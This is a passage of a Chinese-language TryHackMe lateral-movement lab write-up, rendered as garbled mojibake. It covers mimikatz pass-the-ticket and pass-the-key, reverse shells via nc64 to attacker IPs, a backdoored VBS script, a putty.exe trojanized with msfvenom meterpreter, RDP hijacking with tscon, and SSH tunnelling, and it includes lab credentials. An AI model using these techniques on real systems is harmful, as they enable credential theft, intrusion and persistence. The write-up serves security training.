ä¸Š t1_toby.beck çš„æ¡Œé¢ä¸Šæ‰¾åˆ°ä¸€ä¸ªæ ‡å¿—ã€‚ mimikatz å’Œ psexec64 å‡å¯åœ¨ THMJMP2 ä¸Šçš„ C:\\tools å¤„è·å–ã€‚ Pass-the-Ticket å¦‚æœåœ¨ç›®æ ‡æœºæ‹¥æœ‰ç®¡ç†å‘˜æƒé™ï¼Œåˆ™å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•ï¼š privilege::debug sekurlsa::tickets /export è¯·æ³¨æ„ï¼Œå¦‚æœæˆ‘ä»¬åªèƒ½è®¿é—®ç¥¨è¯è€Œä¸èƒ½è®¿é—®å…¶ç›¸åº”çš„ä¼šè¯å¯†é’¥ï¼Œåˆ™æˆ‘ä»¬å°†æ— æ³•ä½¿ç”¨è¯¥ç¥¨è¯ï¼›å› æ­¤ï¼Œä¸¤è€…éƒ½æ˜¯å¿…è¦çš„ã€‚ å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬è·å–åˆ°äº†ç›®æ ‡ç”¨æˆ·çš„TGTç¥¨è¯ã€‚ ä¸€æ—¦æˆ‘ä»¬æå–äº†æ‰€éœ€çš„ç¥¨è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†ç¥¨è¯æ³¨å…¥å½“å‰ä¼šè¯ï¼š mimikatz # kerberos::ptt [0;cd6dd]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi åœ¨æˆ‘ä»¬è‡ªå·±çš„ä¼šè¯ä¸­æ³¨å…¥ç¥¨è¯ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚æ­¤åï¼Œæˆ‘ä»¬ç”¨äºæ¨ªå‘ç§»åŠ¨çš„ä»»ä½•å·¥å…·éƒ½å¯ä»¥ä½¿ç”¨é—¨ç¥¨ã€‚è¦æ£€æŸ¥ç¥¨è¯æ˜¯å¦å·²æ­£ç¡®æ³¨å…¥ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ klist å‘½ä»¤ï¼š å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸæ³¨å…¥ä¼šè¯ï¼ŒæˆåŠŸè¿›å…¥ç›®æ ‡ç”¨æˆ·çš„shell Pass-the-Key privilege::debug sekurlsa::ekeys å¯ä»¥çœ‹åˆ°ç›®æ ‡ç”¨æˆ·å¯ä»¥ä½¿ç”¨aes256ç®—æ³•ä»¥åŠrc4ï¼Œè¿™é‡Œå°±ç”¨aes256äº† sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:\"c:\\tools c64.exe -e cmd.exe 10.50.46.236 5555\" è¿™é‡Œä¹Ÿæ˜¯æˆåŠŸæ‹¿åˆ°shellï¼Œä¸è¿‡æ°å¥½é¶æœºé‡ç½®äº†ï¼Œæ²¡æˆªåˆ°å›¾ï¼Œè¿™é‡Œå°±ç®—äº† 0x06 æ»¥ç”¨ç”¨æˆ·è¡Œä¸º åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç”¨æˆ·æ‰§è¡Œçš„æ“ä½œæ¥è¿›ä¸€æ­¥è®¿é—®ç½‘ç»œä¸­çš„è®¡ç®—æœºã€‚è™½ç„¶å‘ç”Ÿè¿™ç§æƒ…å†µçš„æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œä½†æˆ‘ä»¬å°†è®¨è®ºä¸€äº›æœ€å¸¸è§çš„æ–¹å¼ã€‚ æ»¥ç”¨å¯å†™è‚¡ä»½ åœ¨æ£€æŸ¥å…¬å¸ç¯å¢ƒæ—¶ï¼Œç»å¸¸ä¼šå‘ç°åˆæ³•ç”¨æˆ·ç”¨æ¥æ‰§è¡Œæ—¥å¸¸ä»»åŠ¡çš„ç½‘ç»œå…±äº«ã€‚å¦‚æœè¿™äº›å…±äº«ç”±äºæŸç§åŸå› æ˜¯å¯å†™çš„ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ¤å…¥ç‰¹å®šæ–‡ä»¶æ¥å¼ºåˆ¶ç”¨æˆ·æ‰§è¡Œä»»æ„æœ‰æ•ˆè´Ÿè½½å¹¶è·å¾—å¯¹å…¶è®¡ç®—æœºçš„è®¿é—®æƒé™ã€‚ ä¸€ç§å¸¸è§çš„æƒ…å†µæ˜¯æŸ¥æ‰¾ç½‘ç»œå…±äº«ä¸Šæ‰˜ç®¡çš„è„šæœ¬æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„å¿«æ·æ–¹å¼ã€‚ å…¶èƒŒåçš„åŸºæœ¬åŸç†æ˜¯ï¼Œç®¡ç†å‘˜å¯ä»¥åœ¨ç½‘ç»œå…±äº«ä¸Šç»´æŠ¤å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”ç”¨æˆ·å¯ä»¥æ‰§è¡Œå®ƒï¼Œè€Œæ— éœ€å°†åº”ç”¨ç¨‹åºå¤åˆ¶æˆ–å®‰è£…åˆ°æ¯ä¸ªç”¨æˆ·çš„è®¡ç®—æœºä¸Šã€‚å¦‚æœæˆ‘ä»¬ä½œä¸ºæ”»å‡»è€…æ‹¥æœ‰å¯¹æ­¤ç±»è„šæœ¬æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„å†™å…¥æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹å®ƒä»¬è¿›è¡Œåé—¨ä»¥å¼ºè¿«ç”¨æˆ·æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»»ä½•æœ‰æ•ˆè´Ÿè½½ã€‚ å°½ç®¡è„šæœ¬æˆ–å¯æ‰§è¡Œæ–‡ä»¶æ‰˜ç®¡åœ¨æœåŠ¡å™¨ä¸Šï¼Œä½†å½“ç”¨æˆ·åœ¨å…¶å·¥ä½œç«™ä¸Šæ‰“å¼€å¿«æ·æ–¹å¼æ—¶ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å°†ä»æœåŠ¡å™¨å¤åˆ¶åˆ°å…¶ %temp% æ–‡ä»¶å¤¹å¹¶åœ¨å·¥ä½œç«™ä¸Šæ‰§è¡Œã€‚å› æ­¤ï¼Œä»»ä½•æœ‰æ•ˆè´Ÿè½½éƒ½å°†åœ¨æœ€ç»ˆç”¨æˆ·å·¥ä½œç«™ï¼ˆå’Œç™»å½•ç”¨æˆ·å¸æˆ·ï¼‰çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œã€‚ åé—¨ .vbs è„šæœ¬ ä¾‹å¦‚ï¼Œå¦‚æœå…±äº«èµ„æºæ˜¯VBSè„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥å°†nc64.exeçš„å‰¯æœ¬æ”¾åœ¨åŒä¸€ä¸ªå…±äº«ä¸Šï¼Œå¹¶åœ¨å…±äº«è„šæœ¬ä¸­æ³¨å…¥ä»¥ä¸‹ä»£ç ï¼š CreateObject(\"WScript.Shell\").Run \"cmd.exe /c copy /Y \\\\10.10.28.6\\myshare c64.exe %tmp% &amp; %tmp% c64.exe -e cmd.exe &lt;attacker_ip&gt; 1234\", 0, True è¿™ä¼šå°† nc64.exe ä»å…±äº«å¤åˆ¶åˆ°ç”¨æˆ·å·¥ä½œç«™ %tmp% ç›®å½•ï¼Œå¹¶åœ¨ç”¨æˆ·æ‰“å¼€å…±äº« VBS è„šæœ¬æ—¶å‘æ”»å‡»è€…å‘é€åå‘ shellã€‚ .exe æ–‡ä»¶åé—¨ å¦‚æœå…±äº«æ–‡ä»¶æ˜¯ Windows äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¾‹å¦‚ putty.exeï¼Œæ‚¨å¯ä»¥ä»å…±äº«ä¸‹è½½å®ƒå¹¶ä½¿ç”¨ msfvenom å‘å…¶ä¸­æ³¨å…¥åé—¨ã€‚è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ä»å°†ç…§å¸¸å·¥ä½œï¼Œä½†ä¼šé™é»˜æ‰§è¡Œé¢å¤–çš„æœ‰æ•ˆè´Ÿè½½ã€‚è¦åˆ›å»ºåé—¨ putty.exeï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=4444 -b \"\\x00\" -f exe -o puttyX.exe ç”Ÿæˆçš„ puttyX.exe å°†åœ¨ç”¨æˆ·æ²¡æœ‰æ³¨æ„åˆ°çš„æƒ…å†µä¸‹æ‰§è¡Œreverse_tcp meterpreteræœ‰æ•ˆè´Ÿè½½ã€‚æ–‡ä»¶ç”Ÿæˆåï¼Œæˆ‘ä»¬å¯ä»¥æ›¿æ¢ Windows å…±äº«ä¸Šçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ Metasploit ä¸­çš„exploit/multi/handler æ¨¡å—ç­‰å¾…ä»»ä½•è¿æ¥ã€‚ RDPåŠ«æŒ å½“ç®¡ç†å‘˜ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥åˆ°è®¡ç®—æœºå¹¶å…³é—­ RDP å®¢æˆ·ç«¯è€Œä¸æ˜¯æ³¨é”€æ—¶ï¼Œä»–çš„ä¼šè¯å°†æ— é™æœŸåœ°åœ¨æœåŠ¡å™¨ä¸Šä¿æŒæ‰“å¼€çŠ¶æ€ã€‚å¦‚æœæ‚¨åœ¨ Windows Server 2016 åŠæ›´æ—©ç‰ˆæœ¬ä¸Šæ‹¥æœ‰ç³»ç»Ÿæƒé™ï¼Œåˆ™æ— éœ€å¯†ç å³å¯æ¥ç®¡ä»»ä½•ç°æœ‰ RDP ä¼šè¯ã€‚ å¦‚æœæˆ‘ä»¬æœ‰ç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æˆ‘ä»¬å–œæ¬¢çš„ä»»ä½•æ–¹æ³•è·å– SYSTEMã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ psexec æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ cmd.exeï¼š ä»é‚£é‡Œè¿è¡Œ PsExec64.exe ï¼ˆå¯åœ¨ C:\\tools\\ å¤„è·å–ï¼‰ï¼š PsExec64.exe -s cmd.exe è¦åˆ—å‡ºæœåŠ¡å™¨ä¸Šç°æœ‰çš„ä¼šè¯ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt; query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME &gt;administrator rdp-tcp#6 2 Active . 4/1/2022 4:09 AM luke 3 Disc . 4/6/2022 6:51 AM æ ¹æ®ä¸Šé¢çš„å‘½ä»¤è¾“å‡ºï¼Œå¦‚æœæˆ‘ä»¬å½“å‰ä½¿ç”¨ç®¡ç†å‘˜ç”¨æˆ·é€šè¿‡ RDP è¿æ¥ï¼Œæˆ‘ä»¬çš„ SESSIONNAME å°†ä¸º rdp-tcp#6 ã€‚æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°åä¸º luke çš„ç”¨æˆ·æ‰“å¼€äº†ä¸€ä¸ª ID ä¸º 3 çš„ä¼šè¯ã€‚ä»»ä½•å…·æœ‰å…‰ç›˜çŠ¶æ€çš„ä¼šè¯éƒ½å·²è¢«ç”¨æˆ·ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå¹¶ä¸”ç›®å‰æœªè¢«ä½¿ç”¨ã€‚è™½ç„¶æ‚¨ä¹Ÿå¯ä»¥æ¥ç®¡æ´»åŠ¨ä¼šè¯ï¼Œä½†å½“æ‚¨è¿™æ ·åšæ—¶ï¼Œåˆæ³•ç”¨æˆ·å°†è¢«è¿«é€€å‡ºå…¶ä¼šè¯ï¼Œä»–ä»¬å¯èƒ½ä¼šæ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚ è¦è¿æ¥åˆ°ä¼šè¯ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ tscon.exe å¹¶æŒ‡å®šæˆ‘ä»¬å°†æ¥ç®¡çš„ä¼šè¯ IDï¼Œä»¥åŠå½“å‰çš„ SESSIONNAMEã€‚æŒ‰ç…§å‰é¢çš„ç¤ºä¾‹ï¼Œå¦‚æœæˆ‘ä»¬ä»¥ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½è¿æ¥ï¼Œè¦æ¥ç®¡ luke çš„ä¼šè¯ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š tscon 3 /dest:rdp-tcp#6 ç®€å•æ¥è¯´ï¼Œè¯¥å‘½ä»¤æŒ‡å‡º luke æ‹¥æœ‰çš„å›¾å½¢ä¼šè¯ 3 åº”ä¸ç®¡ç†å‘˜ç”¨æˆ·æ‹¥æœ‰çš„ RDP ä¼šè¯ rdp-tcp#6 è¿æ¥ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å°†æ¢å¤ Luke çš„ RDP ä¼šè¯å¹¶ç«‹å³è¿æ¥åˆ°å®ƒã€‚ æ³¨æ„ï¼šWindows Server 2019 ä¸å…è®¸æ‚¨åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹è¿æ¥åˆ°å…¶ä»–ç”¨æˆ·çš„ä¼šè¯ã€‚ å®è·µç»ƒä¹  è¦å®Œæˆæ­¤ç»ƒä¹ ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ä» http://distributor.za.tryhackme.com/creds_t2 è·å–çš„ä¸€ç»„æ–°å‡­æ®è¿æ¥åˆ° THMJMP2ï¼ˆè¯·æ³¨æ„ï¼Œæ­¤é“¾æ¥ä¸å…¶ä»–ä»»åŠ¡ä¸åŒï¼‰ã€‚è·å¾—å‡­æ®åï¼Œé€šè¿‡ RDP è¿æ¥åˆ° THMJMP2ï¼š xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384 è¿™äº›å‡­æ®å°†æˆäºˆæ‚¨å¯¹ THMJMP2 çš„ç®¡ç†è®¿é—®æƒé™ã€‚ å¯¹äºæ­¤ä»»åŠ¡ï¼Œæˆ‘ä»¬å°†åŠ«æŒ RDP ä¼šè¯ã€‚å¦‚æœæ‚¨æœ‰å…´è¶£å°è¯•åœ¨ exe æˆ–å…¶ä»–æ–‡ä»¶ä¸­æ·»åŠ åé—¨ï¼Œæ‚¨å¯ä»¥åœ¨ Windows æœ¬åœ°æŒä¹…æ€§å®¤ä¸­æ‰¾åˆ°ä¸€äº›ä¸æ­¤ç›¸å…³çš„ç»ƒä¹ ã€‚ æŒ‰ç…§è¯´æ˜åŠ«æŒ t1_toby.beck åœ¨ THMJMP2 ä¸Šçš„ RDP ä¼šè¯ä»¥è·å–æ‚¨çš„æ ‡å¿—ã€‚ æ³¨æ„ï¼šæ‰§è¡Œ query session æ—¶ï¼Œæ‚¨å°†çœ‹åˆ°å‡ ä¸ªåä¸º t1_toby.beck çš„ç”¨æˆ·ï¼Œåè·Ÿä¸€ä¸ªæ•°å­—ã€‚è¿™äº›åªæ˜¯åŒä¸€ç”¨æˆ·çš„ç›¸åŒå‰¯æœ¬ï¼Œæ‚¨å¯ä»¥åŠ«æŒå…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼ˆæ‚¨ä¸éœ€è¦åŠ«æŒå…¨éƒ¨ï¼‰ã€‚ç¡®ä¿åŠ«æŒæ ‡è®°ä¸ºå·²æ–­å¼€è¿æ¥çš„ä¼šè¯ï¼ˆå…‰ç›˜ï¼‰ä»¥é¿å…å¹²æ‰°å…¶ä»–ç”¨æˆ·ã€‚ å½“æˆ‘ä»¬ä»¥ç®¡ç†å‘˜æ‰“å¼€cmdä¹‹åè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š PsExec64.exe -s cmd.exe æ¥ç€åˆ—å‡ºæœåŠ¡å™¨ä¸Šæ‰€æœ‰çš„ä¼šè¯ï¼š query user è¦è¿æ¥åˆ°ä¼šè¯ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ tscon.exe å¹¶æŒ‡å®šæˆ‘ä»¬å°†æ¥ç®¡çš„ä¼šè¯ IDï¼Œä»¥åŠå½“å‰çš„ SESSIONNAMEã€‚æŒ‰ç…§å‰é¢çš„ç¤ºä¾‹ï¼Œå¦‚æœæˆ‘ä»¬ä»¥ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½è¿æ¥ï¼Œè¦æ¥ç®¡ luke çš„ä¼šè¯ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š tscon 4 /dest:rdp-tcp#27 ç®€å•æ¥è¯´ï¼Œè¯¥å‘½ä»¤æŒ‡å‡º t1_toby.beck æ‹¥æœ‰çš„å›¾å½¢ä¼šè¯ 4 åº”ä¸ç®¡ç†å‘˜ç”¨æˆ·æ‹¥æœ‰çš„ RDP ä¼šè¯ rdp-tcp#27 è¿æ¥ã€‚ å¦‚ä¸‹å›¾æˆåŠŸçªƒå–åˆ°ä¼šè¯ 0x07 ç«¯å£è½¬å‘ æˆ‘ä»¬æå‡ºçš„å¤§å¤šæ•°æ¨ªå‘ç§»åŠ¨æŠ€æœ¯éƒ½éœ€è¦ç‰¹å®šç«¯å£å¯ä¾›æ”»å‡»è€…ä½¿ç”¨ã€‚åœ¨ç°å®ç½‘ç»œä¸­ï¼Œç®¡ç†å‘˜å¯èƒ½å‡ºäºå®‰å…¨åŸå› é˜»æ­¢äº†å…¶ä¸­ä¸€äº›ç«¯å£ï¼Œæˆ–è€…åœ¨ç½‘ç»œå‘¨å›´å®æ–½äº†åˆ†æ®µï¼Œä»è€Œé˜»æ­¢æ‚¨è®¿é—® SMBã€RDPã€WinRM æˆ– RPC ç«¯å£ã€‚ ä¸ºäº†ç»•è¿‡è¿™äº›é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç«¯å£è½¬å‘æŠ€æœ¯ï¼Œå…¶ä¸­åŒ…æ‹¬ä½¿ç”¨ä»»ä½•å—æ„ŸæŸ“çš„ä¸»æœºä½œä¸ºè·³è½¬ç›’æ¥è½¬å‘å…¶ä»–ä¸»æœºã€‚é¢„è®¡æŸäº›æœºå™¨å°†æ¯”å…¶ä»–æœºå™¨æ‹¥æœ‰æ›´å¤šçš„ç½‘ç»œæƒé™ï¼Œå› ä¸ºä¼ä¸šä¸­çš„æ¯ä¸ªè§’è‰²åœ¨æ—¥å¸¸å·¥ä½œæ‰€éœ€çš„ç½‘ç»œæœåŠ¡æ–¹é¢éƒ½æœ‰ä¸åŒçš„éœ€æ±‚ã€‚ SSH éš§é“ æˆ‘ä»¬è¦ç ”ç©¶çš„ç¬¬ä¸€ä¸ªåè®®æ˜¯ SSHï¼Œå› ä¸ºå®ƒå·²ç»å…·æœ‰é€šè¿‡ç§°ä¸º SSH éš§é“çš„åŠŸèƒ½è¿›è¡Œç«¯å£è½¬å‘çš„å†…ç½®åŠŸèƒ½ã€‚è™½ç„¶ SSH æ›¾ç»æ˜¯ä¸ Linux ç³»ç»Ÿç›¸å…³çš„åè®®ï¼Œä½† Windows ç°åœ¨é»˜è®¤é™„å¸¦ OpenSSH å®¢æˆ·ç«¯ï¼Œå› æ­¤æ‚¨å¯ä»¥åœ¨å½“ä»Šçš„è®¸å¤šç³»ç»Ÿä¸­æ‰¾åˆ°å®ƒï¼Œè€Œä¸æ“ä½œç³»ç»Ÿæ— å…³ã€‚ SSH éš§é“å¯ä»¥ä»¥ä¸åŒçš„æ–¹å¼ä½¿ç”¨ï¼Œé€šè¿‡ SSH è¿æ¥è½¬å‘ç«¯å£ï¼Œæˆ‘ä»¬å°†æ ¹æ®æƒ…å†µä½¿ç”¨å®ƒã€‚ä¸ºäº†è§£é‡Šæ¯ç§æƒ…å†µï¼Œæˆ‘ä»¬å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œæˆ‘ä»¬å·²ç»è·å¾—äº†å¯¹ PC-1 æœºå™¨çš„æ§åˆ¶æƒï¼ˆä¸éœ€è¦ç®¡ç†å‘˜è®¿é—®æƒé™ï¼‰ï¼Œå¹¶ä¸”å¸Œæœ›å°†å…¶ç”¨ä½œè®¿é—®å¦ä¸€å°æœºå™¨ä¸Šçš„ç«¯å£çš„æ¢çº½ã€‚æˆ‘ä»¬æ— æ³•ç›´æ¥è¿æ¥ã€‚æˆ‘ä»¬å°†å¯åŠ¨ä¸€æ¡ä» PC-1 è®¡ç®—æœºï¼ˆå……å½“ SSH å®¢æˆ·ç«¯ï¼‰åˆ°æ”»å‡»è€… PCï¼ˆå……å½“ SSH æœåŠ¡å™¨ï¼‰çš„éš§é“ã€‚è¿™æ ·åšçš„åŸå› æ˜¯ï¼Œæ‚¨ç»å¸¸ä¼šåœ¨ Windows è®¡ç®—æœºä¸Šæ‰¾åˆ° SSH å®¢æˆ·ç«¯ï¼Œä½†å¤§å¤šæ•°æ—¶å€™æ²¡æœ‰å¯ç”¨çš„ SSH æœåŠ¡å™¨ã€‚ ç”±äºæˆ‘ä»¬å°†è¿æ¥å›æ”»å‡»è€…çš„è®¡ç®—æœºï¼Œå› æ­¤æˆ‘ä»¬å¸Œæœ›åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·ï¼Œè€Œæ— éœ€è®¿é—®ä»»ä½•éš§é“æ§åˆ¶å°ï¼Œå¹¶è®¾ç½®ç”¨äºåˆ›å»ºéš§é“çš„å¯†ç ï¼š useradd tunneluser -m -d /home/tunneluser -s /bin/true passwd tunneluser æ ¹æ®æ‚¨çš„éœ€è¦ï¼ŒSSH éš§é“å¯ç”¨äºæ‰§è¡Œæœ¬åœ°æˆ–è¿œç¨‹ç«¯å£è½¬å‘ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹æ¯ä¸ªæ¡ˆä¾‹ã€‚ SSH è¿œç¨‹ç«¯å£è½¬å‘ åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œå‡è®¾é˜²ç«å¢™ç­–ç•¥é˜»æ­¢æ”»å‡»è€…çš„è®¡ç®—æœºç›´æ¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„ç«¯å£ 3389ã€‚å¦‚æœæ”»å‡»è€…ä¹‹å‰å·²å…¥ä¾µ PC-1ï¼Œå¹¶ä¸” PC-1 å¯ä»¥è®¿é—®æœåŠ¡å™¨çš„ç«¯å£ 3389ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ PC-1 çš„è¿œç¨‹ç«¯å£è½¬å‘å°†å…¶è½¬ç§»åˆ°ç«¯å£ 3389ã€‚è¿œç¨‹ç«¯å£è½¬å‘å…è®¸æ‚¨ä» SSH å®¢æˆ·ç«¯ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º PC-1ï¼‰è·å–å¯è®¿é—®çš„ç«¯å£ï¼Œå¹¶å°†å…¶æŠ•å°„åˆ°è¿œç¨‹ SSH æœåŠ¡å™¨ï¼ˆæ”»å‡»è€…çš„è®¡ç®—æœºï¼‰ä¸­ã€‚ ç»“æœï¼Œæ”»å‡»è€…çš„è®¡ç®—æœºä¸Šå°†æ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œå¯ç”¨äºé€šè¿‡ SSH éš§é“è¿æ¥å›æœåŠ¡å™¨ä¸­çš„ç«¯å£ 3389ã€‚åè¿‡æ¥ï¼ŒPC-1 å°†ä»£ç†è¿æ¥ï¼Œä»¥ä¾¿æœåŠ¡å™¨å°†çœ‹åˆ°æ‰€æœ‰æµé‡ï¼Œå°±å¥½åƒå®ƒæ¥è‡ª PC-1 ä¸€æ ·ï¼š æ­¤æ—¶å¯èƒ½ä¼šå‡ºç°çš„ä¸€ä¸ªæœ‰æ•ˆé—®é¢˜æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å·²ç»ç ´åäº† PC-1 å¹¶ä¸”å¯ä»¥ç›´æ¥ä»é‚£é‡Œè¿è¡Œ RDP ä¼šè¯ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ç«¯å£è½¬å‘ã€‚ç­”æ¡ˆå¾ˆç®€å•ï¼šåœ¨æˆ‘ä»¬åªèƒ½é€šè¿‡æ§åˆ¶å°è®¿é—® PC-1 çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†æ— æ³•ä½¿ç”¨ä»»ä½• RDP å®¢æˆ·ç«¯ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰ GUIã€‚é€šè¿‡ä½¿æ”»å‡»è€…çš„è®¡ç®—æœºå¯ä»¥ä½¿ç”¨è¯¥ç«¯å£ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Linux RDP å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ã€‚å½“æ‚¨æƒ³è¦é’ˆå¯¹æ— æ³•ç›´æ¥è®¿é—®çš„ç«¯å£è¿è¡Œæ¼æ´åˆ©ç”¨æ—¶ï¼Œä¼šå‡ºç°ç±»ä¼¼çš„æƒ…å†µï¼Œå› ä¸ºæ‚¨çš„æ¼æ´åˆ©ç”¨å¯èƒ½éœ€è¦ç‰¹å®šçš„è„šæœ¬è¯­è¨€ï¼Œè€Œè¿™ç§è¯­è¨€å¯èƒ½å¹¶ä¸æ€»æ˜¯åœ¨æ‚¨å¦¥åçš„è®¡ç®—æœºä¸Šå¯ç”¨ã€‚ å‚è€ƒä¸Šå›¾ï¼Œè¦å°†æœåŠ¡å™¨ä¸Šçš„ç«¯å£ 3389 è½¬å‘å›æ”»å‡»è€…çš„è®¡ç®—æœºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ PC-1 ä¸Šä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\&gt; ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user. è¿™å°†ä½¿ç”¨ tunneluser ç”¨æˆ·å»ºç«‹ä» PC-1 åˆ° 1.1.1.1 ï¼ˆæ”»å‡»è€… PCï¼‰çš„ SSH ä¼šè¯ã€‚ ç”±äº tunneluser ä¸å…è®¸åœ¨æ”»å‡»è€…PCä¸Šè¿è¡Œshellï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨ -N å¼€å…³è¿è¡Œ ssh å‘½ä»¤ä»¥é˜²æ­¢å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªï¼Œå¦åˆ™è¿æ¥å°†ç«‹å³é€€å‡ºã€‚ -R å¼€å…³ç”¨äºè¯·æ±‚è¿œç¨‹ç«¯å£è½¬å‘ï¼Œè¯­æ³•è¦æ±‚æˆ‘ä»¬é¦–å…ˆæŒ‡ç¤ºå°†åœ¨ SSH æœåŠ¡å™¨ä¸Šæ‰“å¼€çš„ç«¯å£ (3389)ï¼Œåè·Ÿå†’å·ï¼Œç„¶åæ˜¯ IP å’Œç«¯å£æˆ‘ä»¬å°†è½¬å‘çš„å¥—æ¥å­—çš„åç§° (3.3.3.3:3389)ã€‚è¯·æ³¨æ„ï¼Œç«¯å£å·ä¸éœ€è¦åŒ¹é…ï¼Œä½†åœ¨æœ¬ç¤ºä¾‹ä¸­éœ€è¦åŒ¹é…ã€‚ å‘½ä»¤æœ¬èº«ä¸ä¼šè¾“å‡ºä»»ä½•å†…å®¹ï¼Œä½†éš§é“å°†å–å†³äºè¦è¿è¡Œçš„å‘½ä»¤ã€‚æ— è®ºä½•æ—¶ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥åƒä½¿ç”¨ä»»ä½•å…¶ä»–å‘½ä»¤ä¸€æ ·æŒ‰ CTRL+C æ¥å…³é—­éš§é“ã€‚ ä¸€æ—¦æˆ‘ä»¬çš„éš§é“è®¾ç½®å¹¶è¿è¡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¿é—®æ”»å‡»è€…çš„è®¡ç®—æœºå¹¶é€šè¿‡ RDP è¿›å…¥è½¬å‘ç«¯å£æ¥åˆ°è¾¾æœåŠ¡å™¨ï¼š munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword SSH æœ¬åœ°ç«¯å£è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘å…è®¸æˆ‘ä»¬å°†ç«¯å£ä» SSH æœåŠ¡å™¨â€œæ‹‰â€åˆ° SSH å®¢æˆ·ç«¯ã€‚åœ¨æˆ‘ä»¬çš„åœºæ™¯ä¸­ï¼Œè¿™å¯ç”¨äºè·å–æ”»å‡»è€…è®¡ç®—æœºä¸­å¯ç”¨çš„ä»»ä½•æœåŠ¡ï¼Œå¹¶é€šè¿‡ PC-1 ä¸Šçš„ç«¯å£ä½¿å…¶å¯ç”¨ã€‚è¿™æ ·ï¼Œä»»ä½•æ— æ³•ç›´æ¥è¿æ¥åˆ°æ”»å‡»è€… PC ä½†å¯ä»¥è¿æ¥åˆ° PC-1 çš„ä¸»æœºç°åœ¨éƒ½å¯ä»¥é€šè¿‡æ¢è½´ä¸»æœºè®¿é—®æ”»å‡»è€…çš„æœåŠ¡ã€‚ ä½¿ç”¨è¿™ç§ç±»å‹çš„ç«¯å£è½¬å‘å°†å…è®¸æˆ‘ä»¬ä»é€šå¸¸æ— 